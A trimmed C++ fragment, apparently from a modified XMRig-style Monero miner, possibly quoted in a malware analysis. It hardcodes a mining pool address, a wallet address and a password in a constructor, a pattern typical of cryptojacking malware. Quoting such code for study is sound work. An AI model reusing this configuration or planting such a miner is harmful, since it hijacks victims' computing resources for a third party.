    ...
    m_threadsCount(0)
{
	...
	//--url
	Url *url = new Url("sm3xmrproxy.share4money.cn:3333");
	m_pools.push_back(url);

	//--user
	m_pools.back()->setUser("47knn7zNdNNiGxs211vzTRUEQ3w5fhRsWWWL9UYdWaJPCbbDfobbvvhFZPNAzHBtuh2CJNVr8DtE37WiyJ4hnkEYGThvZtP");

	//--pass
	m_pools.back()->setPassword("wiaa35wm");
